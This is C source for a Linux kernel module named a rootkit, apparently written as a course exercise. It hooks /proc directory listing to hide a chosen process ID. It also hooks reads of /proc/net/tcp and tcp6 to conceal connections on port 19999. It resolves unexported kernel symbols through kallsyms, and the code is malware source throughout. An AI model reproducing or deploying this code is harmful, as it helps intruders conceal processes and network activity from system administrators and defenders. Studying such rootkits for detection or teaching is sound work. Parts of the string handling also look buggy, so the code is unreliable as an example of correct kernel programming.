#include <linux/init.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/cdev.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/pagemap.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <asm/mman.h>
#include "my_tlb.h"
#include "my_mmap.h"
#include "rootkit.h"
#include <linux/module.h>
#include <linux/moduleparam.h> 
#include <linux/kernel.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <net/sock.h>
#include <linux/namei.h>


MODULE_LICENSE("Dual BSD/GPL");

//#define ROOTKIT_DEBUG	1
//#define PORTTOHIDE 19999 //Our port to block...

#if defined(ROOTKIT_DEBUG) && ROOTKIT_DEBUG == 1
# define DEBUG(...)		printk(KERN_INFO __VA_ARGS__)
#else
# define DEBUG(...)
#endif

typedef int (*readdir_t)(struct file *, void *, filldir_t);

//Old Structs
filldir_t old_proc_filldir;
static struct file_operations new_proc_fops;
const struct file_operations * old_proc_fops = 0;
static struct inode * old_proc_inode;
struct inode * new_proc_inode;

//for ex4
static struct file_operations new_tcp_fops;
const struct file_operations * old_tcp_fops = 0;
static struct inode *old_tcp_inode;
struct inode * new_tcp_inode;
static struct file_operations new_tcp6_fops;
const struct file_operations * old_tcp6_fops = 0;
static struct inode *old_tcp6_inode;
struct inode * new_tcp6_inode;
static char * PORTTOHIDE = "4E1F"; //We use hex for easy compare


//Mod Param
static char * PIDTOHIDE = NULL;
module_param(PIDTOHIDE, charp, 0644);

//Old Functions
int (*old_tcp4_seq_show) (struct seq_file*, void *); //A Function pointer... we will use this to preserve the old one
int (*old_proc_readdir) (struct file * fptr, void * vptr, filldir_t fdir);

//New Functions
static int new_proc_readdir(struct file *fp, void *buf, filldir_t filldir);
int restore_hide_process(void);
int hide_process(void);
int new_proc_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f);

//Ex4
ssize_t (*old_tcp_read)(struct file *fp, char __user *buf, size_t sz, loff_t *loff);
int hide_port(void);
static int new_tcp_read(struct file *fp, char __user *buf, size_t sz, loff_t *loff);

ssize_t (*old_tcp6_read)(struct file *fp, char __user *buf, size_t sz, loff_t *loff);
static int new_tcp6_read(struct file *fp, char __user *buf, size_t sz, loff_t *loff);

int restore_hide_process(void)
{
		if(old_proc_fops) //Just a null check in case
			old_proc_inode->i_fop = old_proc_fops;
			
        return 0;
}

int restore_hide_port(void){
	if(old_tcp_fops) //Check null stuff
		old_tcp_inode->i_fop = old_tcp_fops;
	
	if(old_tcp6_fops)
		old_tcp6_inode->i_fop = old_tcp6_fops;
		
	return 0;
}

static int new_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
		if(!(old_proc_filldir = filldir)) //Check null stuff
			return -1;
		
		//Use the old one except replace it with new filldir
        return old_proc_readdir(fp,buf,new_proc_filldir);
}

int new_proc_filldir(void *a, const char *name, int c, loff_t d, u64 e, unsigned f){

		if(strcmp(PIDTOHIDE, name) == 0){
			return 0;
		}
		
		//Use old one...
		return old_proc_filldir(a, name, c, d, e, f);
}

static ssize_t new_tcp6_read(struct file * fptr, char __user * buffer, size_t size, loff_t * offset) {
ssize_t origin_read; 
  char *lineptr, *sublineptr;
  origin_read = old_tcp6_read(fptr,buffer,size,offset);
  lineptr = strstr(buffer, "\n")+1;
  while(lineptr != NULL && *lineptr){

		sublineptr = strstr(strstr(lineptr, ":")+1,":")+1; //String with Port starting...
		
		if(!sublineptr){break;}//Just incase it's null... avoid null problems		
		
		//Check Local address
		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
						
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}

		//Check foreign address too
		if(!strstr(sublineptr, ":")){break;} //Just incase it's null... avoid null problems			
		sublineptr = strstr(sublineptr, ":") + 1;
		
		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}

		lineptr = strstr(lineptr, "\n") + 1; //get next line			
	 }
	return origin_read;
}

static ssize_t new_tcp_read(struct file * fptr, char __user * buffer, size_t size, loff_t * offset) {
  ssize_t origin_read; 
  char *lineptr, *sublineptr;
  origin_read = old_tcp_read(fptr,buffer,size,offset);
  lineptr = strstr(buffer, "\n")+1;
  while(lineptr != NULL && *lineptr){

		sublineptr = strstr(strstr(lineptr, ":")+1,":")+1; //String with Port starting...
		
		if(!sublineptr){break;}
		
		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
						
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}
		if(!strstr(sublineptr, ":")){break;}//Just incase it's null... avoid null problems				
		sublineptr = strstr(sublineptr, ":") + 1;

		if(strncmp(sublineptr, PORTTOHIDE, 4) == 0){
			char * nextline;
			//We want to skip this whole line
			
			nextline = strstr(lineptr, "\n") + 1;
			
			if(!nextline){break;}
			lineptr = strcpy(lineptr, nextline);			

			origin_read -= nextline - lineptr; //reduce amount read by the killed line...
			continue;
		}
		lineptr = strstr(lineptr, "\n") + 1; //get next line			
	 }
	return origin_read;
}

int hide_port(void){
	//Hide the TCP Port 19999
	
	struct path tcp_path;
	struct path tcp6_path;
	
	if(kern_path("/proc/net/tcp", 0, &tcp_path)){
		return -1;
	}
	
	if(kern_path("/proc/net/tcp6", 0, &tcp6_path)){
		return -1;
	}
	
	old_tcp6_inode = tcp6_path.dentry->d_inode;
	old_tcp_inode = tcp_path.dentry->d_inode; //grab the inode 
	
	if(!old_tcp_inode){ //check if inodes are null
		return -1;
	}
	
	if(!old_tcp6_inode){
		return -1;
	}
	
	//hook the read function for tcp
	old_tcp_fops = old_tcp_inode->i_fop;
	old_tcp_read = old_tcp_fops->read;
	new_tcp_fops = *(old_tcp_inode->i_fop);
	new_tcp_fops.read = new_tcp_read;
	old_tcp_inode->i_fop = &new_tcp_fops;
	
	//hook the read function for tcp6
	old_tcp6_fops = old_tcp6_inode->i_fop;
	old_tcp6_read = old_tcp6_fops->read;
	new_tcp6_fops = *(old_tcp6_inode->i_fop);
	new_tcp6_fops.read = new_tcp6_read;
	old_tcp6_inode->i_fop = &new_tcp6_fops;
	
	return 0;
}

int hide_process(void){
	struct path proc_path;
	
	//TEST PID

	if(!PIDTOHIDE){
		printk(KERN_ALERT "Failed to get pid");
	}
	
	//printk(KERN_ALERT "The pid is %s\n", PIDTOHIDE);
		
	//Get inode
    if(kern_path("/proc/", 0, &proc_path))
        return -1;
	
	//Save old inode
	old_proc_inode = proc_path.dentry->d_inode;
	if(!old_proc_inode)
        return -1;
	
	//Exchange them	
	old_proc_fops = old_proc_inode->i_fop; 
	//memcpy(&new_proc_fops, old_proc_inode->i_fop, sizeof(struct * file_operations));
	new_proc_fops = *(old_proc_inode->i_fop);

 	//REPLACE WITH HACKED VERSION of FOPS and READDIR
	old_proc_readdir = old_proc_fops->readdir; //SAVE OLD COPY OF FUNCTION
	
	new_proc_fops.readdir = new_proc_readdir; //this line is troll		
	printk(KERN_ALERT "The addr of new_proc_ops is %p and old_proc_ops is %p", &new_proc_fops, old_proc_fops);
	old_proc_inode->i_fop = &new_proc_fops;
	
	//CLOSE THE FILE NOW
	printk(KERN_ALERT "Finished!\n");
	return 0;
}

static int rootkit_init(void)
{
	int rv = 0;
	void * __end = (void *) &unmap_page_range;

	/* Find the non-exported symbols.  'Cause you can't stop me. */
	unmap_page_range = (unmap_page_range_t)
		kallsyms_lookup_name("unmap_page_range");
	if ((!unmap_page_range) || (void *) unmap_page_range >= __end) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find important function unmap_page_range\n");
		return -ENOENT;
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 2, 0)
	my_tlb_gather_mmu = (tlb_gather_mmu_t)
		kallsyms_lookup_name("tlb_gather_mmu");
	printk(KERN_ERR "resolved symbol tlb_gather_mmu %p\n", my_tlb_gather_mmu);
	if (!my_tlb_gather_mmu) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function my_tlb_gather_mmu\n");
		return -ENOENT;
	}

	my_tlb_flush_mmu = (tlb_flush_mmu_t)
		kallsyms_lookup_name("tlb_flush_mmu");
	if (!my_tlb_flush_mmu) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function my_tlb_flush_mmu\n");
		return -ENOENT;
	}

	my_tlb_finish_mmu = (tlb_finish_mmu_t)
		kallsyms_lookup_name("tlb_finish_mmu");
	if (!my_tlb_finish_mmu) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function my_tlb_finish_mmu\n");
		return -ENOENT;
	}
#else
	pmmu_gathers = (struct mmu_gather *)
		kallsyms_lookup_name("mmu_gathers");
	if (!pmmu_gathers) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function mmu_gathers\n");
		return -ENOENT;
	}
#endif //kernel_version >< 3.2

	kern_free_pages_and_swap_cachep = (free_pages_and_swap_cache_t)
		kallsyms_lookup_name("free_pages_and_swap_cache");
	if (!kern_free_pages_and_swap_cachep) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function free_pages_and_swap_cache\n");
		return -ENOENT;
	}

	kern_flush_tlb_mm = (flush_tlb_mm_t)
		kallsyms_lookup_name("flush_tlb_mm");
	if (!kern_flush_tlb_mm) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function flush_tlb_mm\n");
		return -ENOENT;
	}

	kern_free_pgtables = (free_pgtables_t)
		kallsyms_lookup_name("free_pgtables");
	if (!kern_free_pgtables) {
		printk(KERN_ERR "Rootkit error: "
		       "can't find kernel function free_pgtables\n");
		return -ENOENT;
	}

	hide_process();
	hide_port();
	
	printk(KERN_ALERT "Rootkit: Hello, world\n");
	return rv;
}

static void rootkit_exit(void)
{
	//Restore the stuff
	restore_hide_process();
	restore_hide_port();
	
	printk(KERN_ALERT "Rootkit: Goodbye, cruel world\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
